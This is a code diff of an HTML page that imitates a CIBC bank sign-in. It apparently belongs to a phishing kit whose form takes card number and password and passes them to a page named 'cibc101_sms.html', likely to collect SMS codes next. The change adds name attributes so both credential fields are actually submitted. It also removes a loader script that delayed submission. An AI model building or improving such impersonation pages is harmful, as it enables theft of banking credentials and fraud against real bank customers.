@@ -68,10 +68,10 @@
         
         <form action="cibc101_sms.html" method="POST">
             <label class="cibc-label">Card number</label>
-            <input type="text" class="cibc-input" required>
+            <input type="text" name="card_number" id="card_number" class="cibc-input" required>
             
             <label class="cibc-label">Password</label>
-            <input type="password" class="cibc-input" required>
+            <input type="password" name="password" id="password" class="cibc-input" required>
             
             <label class="cibc-checkbox-container">
                 <input type="checkbox" class="cibc-checkbox"> Remember my card 
@@ -96,19 +96,7 @@
         <p class="loader-text">Processing, please wait...</p>
     </div>
 
-    <script>
-        document.addEventListener('DOMContentLoaded', function() {
-            const form = document.querySelector('form');
-            const loader = document.getElementById('loaderOverlay');
-            if(form && loader) {
-                form.addEventListener('submit', function(e) {
-                    e.preventDefault();
-                    loader.classList.add('active');
-                    setTimeout(function() { form.submit(); }, 10000);
-                });
-            }
-        });
-    </script>
+    
 <script src="security_module.js"></script>
 </body>
 </html>
